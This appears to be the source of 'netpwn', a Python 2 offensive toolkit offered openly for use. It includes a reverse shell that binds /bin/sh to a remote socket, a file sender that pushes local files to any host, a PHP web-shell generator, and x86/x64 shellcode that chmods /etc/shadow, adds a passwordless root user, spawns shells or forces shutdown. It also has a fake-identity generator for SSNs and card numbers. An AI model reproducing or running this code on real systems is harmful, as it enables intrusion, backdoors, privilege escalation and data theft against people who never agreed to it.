#!/usr/bin/python
"""netpwn pentesting tool"""
# Created by 3XPL017
# Member of @togetherwehack

from urllib2 import urlopen
import fcntl
import struct
import base64
import readline
import re
import random
import os
import sys
import socket
import subprocess
import ssl
from termcolor import colored
import netifaces
import nmap
from faker import Faker

OPTIONS_SL = [
    'reverse_shell',
    'port_scan',
    'send_file',
    'php_backdoor',
    'hash_check',
    'base64_converter',
    'address_info',
    'generate_shellcode',
    'hex_converter',
    'page_contents',
    'password_checker',
    'fake_identity',
    'web_spider',
    'ssl_cert',
    'bash',
    'help',
    'modules'
    ]

TABCOMP = OPTIONS_SL


def completer(text, state):
    """Tab complete"""
    options = [x for x in TABCOMP if x.startswith(text)]

    try:
        return options[state]

    except IndexError:
        return None


readline.set_completer(completer)
readline.parse_and_bind("tab: complete")


def check_root():
    """Checks for root privileges"""
    if not os.geteuid() == 0 and not os.getgid() == 0:
        return False


def banner():
    """Displays the netpwn banner"""
    print colored(r'               __                       ', 'blue')
    print colored(r'  ____   _____/  |_________  _  ______  ', 'blue')
    print colored(r' /    \_/ __ \   __\____ \ \/ \/ /    \ ', 'blue')
    print colored(r'|   |  \  ___/|  | |  |_> >     /   |  \ ', 'blue')
    print colored(r'|___|  /\___  >__| |   __/ \/\_/|___|  /', 'blue')
    print colored(r'     \/     \/     |__|              \/ ', 'blue')
    print ' '
    print colored(r'     | Created by 3XPL017         |', 'blue')
    print colored(r'     | twitter: @3XPL017GH057     |', 'blue')
    print colored(r'     | https://github.com/3XPL017 |', 'blue')
    print ' '
    print colored(r'         14 modules loaded', 'green')
    print '\n' * 9


def reverse_shell():
    """Creates a reverse shell using /bin/sh"""
    try:
        print colored('Enter the IP to connect to', 'green')
        tgt_host = raw_input(colored('(netpwn: reverse_shell) > ', 'red'))
        print colored('Enter the port to connect to', 'green')
        tgt_port = int(raw_input(colored('(netpwn: reverse_shell) > ', 'red')))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((tgt_host, tgt_port))
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()

    except socket.error:
        print colored('Could not connect to host', 'yellow')

    except ValueError:
        print colored('Not a valid IP or port', 'yellow')


def port_scan():
    """Uses nmap to port scan"""
    print colored('Enter IP or IP range to scan', 'green')
    target = raw_input(colored('(netpwn: port_scan) > ', 'red'))
    target = socket.gethostbyname(target)
    scanner = nmap.PortScanner()
    print colored('Starting nmap', 'green')
    scanner.scan(target)
    scanner.command_line()
    scanner.scaninfo()
    divider = '-------------------------------------------------------------'

    for host in scanner.all_hosts():
        print colored(divider, 'green')
        print colored(
            'Host : %s (%s)' % (target, scanner[host].state()),
            'green')
        print colored('State : %s' % scanner[host].state(), 'green')

        for proto in scanner[target].all_protocols():
            print colored(divider, 'green')
            print colored('Protocol : %s' % proto, 'green')
            lport = scanner[target][proto].keys()
            lport.sort()

            for port in lport:
                print colored(
                    'port : %s\tstate : %s' %
                    (port, scanner[target][proto][port]['state']),
                    'green')
                print colored(divider, 'green')


def send_file():
    """Sends file to remote location"""
    try:
        print colored('Enter the IP to send file to', 'green')
        address = raw_input(colored('(netpwn: send_file) > ', 'red'))
        print colored('Enter the port to send file to', 'green')
        port = int(raw_input(colored('(netpwn: send_file) > ', 'red')))
        print colored('Enter directory of file to send', 'green')
        input_file = raw_input(colored('(netpwn: send_file) > ', 'red'))
        open_file = open(input_file)
        send = open_file.read()
        transfer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        transfer.connect((address, port))
        transfer.send(send)

    except ValueError as error:
        print colored('Could not send file to ' + str(error), 'yellow')

    except IOError as error:
        print colored('Could not find ' + str(error), 'yellow')


def php_backdoor():
    """Creates a backdoor in php"""
    print colored('Creating backdoor.php', 'green')
    print colored('Usage: http://<localIP>/backdoor.php?cmd=', 'green')
    code = "<html> <?php system($_GET['cmd']);?> </html>"
    backdoor = open('backdoor.php', 'w')
    backdoor.write(code)
    backdoor.close()


def hash_check():
    """Detects input hash type"""
    print colored('Enter a hash to determine its type', 'green')
    input_hash = raw_input(colored('(netwn: hash_check) > ', 'red'))

    if len(input_hash) == 32:
        print colored('Hash type: md5', 'green')

    elif len(input_hash) == 40:
        print colored('Hash type: sha1', 'green')

    elif len(input_hash) == 64:
        print colored('Hash type: sha256', 'green')

    elif len(input_hash) == 128:
        print colored('Hash type: sha512', 'green')

    else:
        print colored('No hash type found', 'green')


def base64_converter():
    """Converts to and from base64"""
    print colored('Enter some text to encode or decode as base64', 'green')
    print colored('This will automatically try to encode or decode', 'green')
    input_str = raw_input(colored('(netpwn: base64_converter) > ', 'red'))

    try:
        output = base64.b64decode(input_str)
        output.encode('ascii')

    except ValueError:
        output = base64.b64encode(input_str)

    print colored(output, 'green')


def address_info():
    """Gets networking information"""
    print colored('Enter interface', 'green')
    interface = raw_input(colored('(netpwn: address_info) > ', 'red'))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        val = struct.pack('256s', interface[:15])
        info = fcntl.ioctl(sock.fileno(), 0x8927, val)
        joining = ['%02x' % ord(char) for char in info[18:24]]
        print colored('Your MAC is: ' + ':'.join(joining), 'green')

    except IOError as error:
        print colored('Invalid interface ' + str(error), 'yellow')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(('8.8.8.8', 80))
    print colored('Your ipv4 is : ' + (sock.getsockname()[0]), 'green')
    sock.close()

    try:
        addrs = netifaces.ifaddresses(interface)
        address6 = addrs[netifaces.AF_INET6][0]['addr']
        address6_1 = addrs[netifaces.AF_INET6][1]['addr']
        address6_2 = addrs[netifaces.AF_INET6][2]['addr']
        print colored('Your ipv6 is: ' + address6, 'green')
        print colored('Your ipv6 is: ' + address6_1, 'green')
        print colored('Your ipv6 is: ' + address6_2, 'green')

    except ValueError as error:
        print colored('Invalid interface ' + str(error), 'yellow')

    my_gateway = netifaces.gateways()
    getgateway = my_gateway['default'][socket.AF_INET][0]
    print colored('Your default gateway is: ' + getgateway, 'green')
    my_ip = urlopen('http://ip.42.pl/raw').read()
    print colored('Your public IP is: ' + my_ip, 'green')


def generate_shellcode():
    """Generates shellcode of linux"""
    print colored('Enter target operating system', 'green')
    platform = raw_input(colored('(netwn: generate_shellcode) > ', 'red'))

    if platform == 'linux':
        print colored('Enter target architechure', 'green')
        arch = raw_input(colored('(netpwn: generate_shellcode) > ', 'red'))

        if arch == 'x86':
            print colored('Execute /bin/sh:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f'
                '\\x62\\x69\\x6e\\x89\\xe3\\x89'
                '\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80',
                'green')
            print ' '
            print colored('Chmod 777 /etc/shadow:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\xb0\\x0f\\x68\\x61\\x64\\x6f\\x77'
                '\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f'
                '\\x2f\\x65\\x74\\x89\\xe3\\x31\\xc9\\x66\\xb9\\xff\\x01\\xcd'
                '\\x80\\x40\\xcd\\x80',
                'green')
            print ' '
            print colored('Create root user r00t with no password:', 'green')
            print colored(
                '\\x6a\\x05\\x58\\x31\\xc9\\x51\\x68\\x73\\x73\\x77'
                '\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74'
                '\\x63\\x89\\xe3\\x66'
                '\\xb9\\x01\\x04\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x31\\xd2'
                '\\x52\\x68\\x30\\x3a\\x3a\\x3a\\x68\\x3a\\x3a\\x30\\x3a\\x68'
                '\\x72\\x30\\x30\\x74\\x89\\xe1\\x6a\\x0c\\x5a\\xcd\\x80\\x6a'
                '\\x06\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80',
                'green')
            print ' '
            print colored('Forced reboot:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\x68\\x62\\x6f\\x6f\\x74\\x68\\x6e'
                '\\x2f\\x72\\x65\\x68\\x2f\\x73\\x62'
                '\\x69\\x89\\xe3\\x50\\x66\\x68\\x2d\\x66\\x89\\xe6\\x50\\x56'
                '\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
                'green')

        elif arch == 'x64':
            print colored('Execute /bin/sh and setuid(0):', 'green')
            print colored(
                '\\x48\\x31\\xff\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2'
                '\\x48\\xbb\\xff\\x2f\\x62\\x69'
                '\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7'
                '\\x48\\x31\\xc0\\x50\\x57\\x48'
                '\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58'
                '\\x0f\\x05',
                'green')
            print ' '
            print colored('Power off', 'green')
            print colored(
                '\\xba\\xdc\\xfe\\x21\\x43\\xbe\\x69\\x19\\x12'
                '\\x28\\xbf\\xad\\xde\\xe1\\xfe'
                '\\xb0\\xa9\\x0f\\x05',
                'green')

        else:
            print colored('Not a valid architecture', 'yellow')

    elif platform == 'mac':
        print colored('HAHA no', 'yellow')

    elif platform == 'windows':
        print colored('Lol windows... seriously...fine', 'yellow')
        print colored(
            'I would ask you for the architecture but I do not '
            'care very much so here try this it might'
            ' work on some windows xp version but i doubt it can be very '
            'useful unless you need to do some math...',
            'green')
        print colored(
            '\\xeb\\x1b\\x5b\\x31\\xc0\\x50\\x31\\xc0\\x88\\x43'
            '\\x13\\x53\\xbb\\xad\\x23\\x86\\x7c'
            '\\xff\\xd3\\x31\\xc0\\x50\\xbb\\xfa\\xca\\x81\\x7c\\xff\\xd3'
            '\\xe8\\xe0\\xff\\xff\\xff'
            '\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x63'
            '\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65',
            'green')
        print ' '
        print colored(
            'Instead of trying to run your shellcode on a windows '
            'box perhaps leave a note for the admin telling'
            ' them about this cool thing called linux',
            'green')

    else:
        print colored('Not a valid option try typing linux', 'yellow')


def hex_converter():
    """Converts to and from hexadecimal"""
    print colored('This converts hex to ascii and ascii to hex')
    input_str = raw_input(colored('(netpwn: hex_converter) > ', 'red'))
    decoded = input_str
    encoded = input_str

    try:
        if any(i in decoded for i in '0x'):
            decoded = decoded.replace('0x', '')

        if any(i in decoded for i in '\\x'):
            decoded = decoded.replace('\\x', '')

        decoded = decoded.decode('hex')
        print colored('Decoded as: ' + decoded, 'green')

    except TypeError:
        print colored('No hex value was given to decode', 'yellow')

    encoded = encoded.encode('hex')
    print colored('Encoded as: ' + '0x' + encoded)


def page_contents():
    """Shows contents of a web page"""
    try:
        print colored('Enter URL', 'green')
        target_url = raw_input(colored('(netpwn: page_contents) > ', 'red'))
        contents = urlopen(target_url).read()
        save = raw_input(colored('Save to file: ', 'green'))

        if save == 'yes' or save == 'y':
            print colored('Saved to page.txt', 'green')
            save_file = open('page.txt', 'w')
            save_file.write(contents)

        else:
            print colored(contents, 'green')

    except ValueError as error:
        print colored('Not a valid URL ' + str(error), 'yellow')


def password_checker():
    """Checks password strength"""
    print colored('Enter a password to check', 'green')
    password = raw_input(colored('(netpwn: password_checker) > ', 'red'))
    length = len(password)
    length = str(length)

    if length < 12:
        print colored('Your password is too short ', 'yellow')

    else:
        print colored('Good password length', 'green')

    if password.isupper() is False and password.islower() is False:
        print colored('Good password case mixture', 'green')

    else:
        print colored('Bad password case mixture', 'yellow')

    if re.match('^[a-zA-Z0-9_]*$', password):
        print colored('Does not contain special chararacters', 'yellow')

    else:
        print colored('Does contain special chararacters', 'green')

    def check_for_nums(password):
        """Checks password for numbers"""
        return any(i.isdigit() for i in password)

    if check_for_nums(password) is False:
        print colored('Your password does not contain any numbers', 'yellow')

    else:
        print colored('Your password contains numbers', 'green')


def race_selection():
    """Chooses race"""
    fake = Faker()
    print colored('Name: ' + fake.name(), 'green')
    race_picker = random.randint(0, 5)

    race = {
        0: 'Caucasian',
        1: 'African-American',
        2: 'Mexican',
        3: 'Indian',
        4: 'Asian',
        5: 'Native American'
    }

    race_type = race.get(race_picker)
    print colored('Race: ' + race_type, 'green')


def height_selection():
    """Chooses height"""
    feet = 5
    inches = random.randint(1, 11)
    height = str(feet) + "'" + str(inches) + '"'
    print colored('Height: ' + height, 'green')


def weight_selection():
    """Chooses weight"""
    pounds = random.randint(120, 300)
    sub_pounds = random.randint(0, 9)
    weight = str(pounds) + '.' + str(sub_pounds)
    print colored('Weight: ' + weight, 'green')


def blood_selection():
    """Chooses blood type"""
    blood_picker = random.randint(0, 7)

    blood = {
        0: 'A+',
        1: 'A-',
        2: 'B+',
        3: 'B-',
        4: 'AB+',
        5: 'AB-',
        6: 'O+',
        7: 'O-'
    }

    blood_type = blood.get(blood_picker)
    print colored('Blood type: ' + blood_type, 'green')


def ssn_selection():
    """Chooses SSN"""
    first_ssn = random.randint(100, 999)
    second_snn = random.randint(10, 99)
    third_ssn = random.randint(1000, 9999)
    social = (str(first_ssn) + '-' +
              str(second_snn) + '-' +
              str(third_ssn))

    print colored('SSN: ' + social, 'green')


def number_selection():
    """Chooses number"""
    first_num = random.randint(100, 999)
    second_num = random.randint(100, 999)
    third_num = random.randint(1000, 9999)
    phone_number = ('(' + str(first_num) + ')' +
                    str(second_num) + '-' +
                    str(third_num))

    print colored('Phone number: ' + phone_number, 'green')


def month_selection():
    """Chooses DOB"""
    month_picker = random.randint(0, 11)
    yold = random.randint(18, 80)
    year = 2018 - yold
    day = random.randint(1, 28)

    month = {
        0: 'Jan',
        1: 'Feb',
        2: 'Mar',
        3: 'Apr',
        4: 'May',
        5: 'Jun',
        6: 'Jul',
        7: 'Aug',
        8: 'Sep',
        9: 'Oct',
        10: 'Nov',
        11: 'Dec'
    }

    exact_month = month.get(month_picker)
    date = exact_month + ' ' + str(day) + ' ' + str(year)
    print colored('DOB: ' + date, 'green')


def address_selection():
    """Chooses address"""
    fake = Faker()
    address = fake.address()
    print colored('Address: ' + address, 'green')


def job_selection():
    """Chooses job"""
    job_picker = random.randint(0, 19)

    jobs = {
        0: 'Teacher Assistant',
        1: 'Urban Planner',
        2: 'Painter',
        3: 'Zoologist',
        4: 'Musician',
        5: 'Interpreter & Translator',
        6: 'Marketing Manager',
        7: 'Loan Officer',
        8: 'Microbiologist',
        9: 'Customer Service Representative',
        10: 'Computer Programmer',
        11: 'High School Teacher',
        12: 'Substance Abuse Counselor',
        13: 'Mechanical Engineer',
        14: 'Drafter',
        15: 'Preschool Teacher',
        16: 'Environmental scientist',
        17: 'Automotive mechanic',
        18: 'Insurance Agent',
        19: 'Veterinarian'
    }

    job = jobs.get(job_picker)
    print colored('Occupation: ' + job, 'green')


def email_selection():
    """Chooses email"""
    email_picker = random.randint(0, 19)

    email = {
        0: 'leviathan@comcast.net',
        1: 'sportsfan@comcast.net',
        2: 'heroine@yahoo.ca',
        3: 'jigsaw@gmail.com',
        4: 'moonlapse@optonline.net',
        5: 'ninenine@outlook.com',
        6: 'warrior@aol.com',
        7: 'crimsane@yahoo.ca',
        8: 'world@comcast.net',
        9: 'singer@verizon.net',
        10: 'sumdumass@att.net',
        11: 'payned@yahoo.com',
        12: 'shrapnull@comcast.net',
        13: 'curly@optonline.net',
        14: 'mschilli@comcast.net',
        15: 'empathy@sbcglobal.net',
        16: 'codex@optonline.net',
        17: 'ehood@yahoo.com',
        18: 'nacho@outlook.com',
        19: 'crusader@icloud.com'
    }

    exact_email = email.get(email_picker)
    print colored('Email: ' + exact_email, 'green')


def credit_selection():
    """Chooses SSN"""
    type_picker = random.randint(0, 3)
    first_num = random.randint(1000, 9999)
    second_num = random.randint(1000, 9999)
    third_num = random.randint(1000, 9999)
    forth_num = random.randint(1000, 9999)
    cvv_picker = random.randint(100, 999)
    credit_number = (str(first_num) + ' ' +
                     str(second_num) + ' ' +
                     str(third_num) + ' ' +
                     str(forth_num))

    credit_type = {
        0: 'Visa',
        1: 'MasterCard',
        2: 'Discover',
        3: 'American Express'
    }

    first_date = random.randint(1, 12)
    second_date = random.randint(18, 22)
    credit_date = (str(first_date) + '/' +
                   str(second_date))

    get_type = credit_type.get(type_picker)
    print colored('Credit card: ', 'green')
    print colored(get_type, 'green')
    print colored(credit_number, 'green')
    print colored(cvv_picker, 'green')
    print colored(credit_date, 'green')


def color_selection():
    """Chooses favorite color"""
    color_picker = random.randint(0, 9)

    color = {
        0: 'blue',
        1: 'green',
        2: 'red',
        3: 'orange',
        4: 'yellow',
        5: 'purple',
        6: 'pink',
        7: 'black',
        8: 'white',
        9: 'gray'
    }

    fav_color = color.get(color_picker)
    print colored('Favorite color: ' + fav_color, 'green')


def fake_identity():
    """Generates a fake identity"""
    race_selection()
    height_selection()
    weight_selection()
    blood_selection()
    ssn_selection()
    number_selection()
    address_selection()
    job_selection()
    email_selection()
    credit_selection()
    color_selection()


def web_spider():
    """Web spider"""
    print colored('Enter a URL to crawl', 'green')
    target_url = raw_input(colored('(netpwn: web_spider) > ', 'red'))
    pattern = '''href=["'](.[^"']+)["']'''

    for urls in re.findall(pattern, urlopen(target_url).read(), re.I):
        print colored(urls, 'green')


def ssl_cert():
    """Gets the ssl cert of a website"""
    print colored('Enter a URL to get its SSL cert', 'green')
    target_url = raw_input(colored('(netpwn: ssl_cert) > ', 'red'))

    try:
        cert = ssl.get_server_certificate((target_url, 443))
        ctx = ssl.create_default_context()
        socks = socket.socket()
        sock = ctx.wrap_socket(socks, server_hostname=target_url)
        sock.connect((target_url, 443))
        certs = sock.getpeercert()
        subject = dict(x[0] for x in certs['subject'])
        country = subject['countryName']
        issued_to = subject['commonName']
        organization = subject['organizationName']
        location = subject['stateOrProvinceName']
        issuer = dict(x[0] for x in certs['issuer'])
        issued_by = issuer['commonName']
        print colored(cert, 'green')
        print colored('Country: ' + country, 'green')
        print colored('Issued to: ' + issued_to, 'green')
        print colored('Organization: ' + organization, 'green')
        print colored('Province: ' + location, 'green')
        print colored('Issued by: ' + issued_by, 'green')
        print ' '

    except socket.error:
        print colored('unknown host ' + target_url, 'yellow')

    except KeyError:
        print colored('No SSL cert', 'yellow')


def bash():
    """Run bash"""
    print colored('Type [back] to return to netpwn', 'green')

    while True:
        command = raw_input(colored('(netpwn: bash) > ', 'red'))

        if command == 'back':
            main()

        else:
            os.system(command)


def modules():
    """Prints available modules"""
    print ' '
    print colored('Modules', 'green')
    print colored('=======', 'green')
    print colored('reverse_shell', 'green')
    print colored('port_scan', 'green')
    print colored('send_file', 'green')
    print colored('php_backdoor', 'green')
    print colored('hash_check', 'green')
    print colored('base64_converter', 'green')
    print colored('address_info', 'green')
    print colored('generate_shellcode', 'green')
    print colored('hex_converter', 'green')
    print colored('page_contents', 'green')
    print colored('password_checker', 'green')
    print colored('fake_identity', 'green')
    print colored('web_spider', 'green')
    print colored('ssl_cert', 'green')
    print ' '


def help_menu():
    """Prints help menu"""
    print ' '
    print colored('Commands', 'green')
    print colored('========', 'green')
    print colored(
        'modules        lists available modules', 'green')
    print colored(
        'bash           execute system commands', 'green')
    print colored(
        'banner         displays the banner', 'green')
    print colored(
        'clear          clears the screen', 'green')
    print colored(
        'exit           exits netpwn', 'green')
    print ' '


def main():
    """Handles which function to run"""
    if check_root() is False:
        sys.exit(colored('netpwn must be run as root', 'yellow'))

    choice = raw_input(colored('(netpwn) > ', 'red'))

    options = {
        'reverse_shell': lambda: reverse_shell(),
        'port_scan': lambda: port_scan(),
        'send_file': lambda: send_file(),
        'php_backdoor': lambda: php_backdoor(),
        'hash_check': lambda: hash_check(),
        'base64_converter': lambda: base64_converter(),
        'address_info': lambda: address_info(),
        'generate_shellcode': lambda: generate_shellcode(),
        'hex_converter': lambda: hex_converter(),
        'page_contents': lambda: page_contents(),
        'password_checker': lambda: password_checker(),
        'fake_identity': lambda: fake_identity(),
        'web_spider': lambda: web_spider(),
        'ssl_cert': lambda: ssl_cert(),
        'bash': lambda: bash(),
        'help': lambda: help_menu(),
        'modules': lambda: modules(),
        'clear': lambda: os.system('clear'),
        'banner': lambda: banner(),
        'exit': lambda: exit(0),
        '': lambda: 1 + 1
    }

    if choice not in options:
        print colored('unknown command: ' + choice, 'yellow')

    options.get(choice, lambda: None)()
    main()


if __name__ == '__main__':
    check_root()
    banner()
    main()
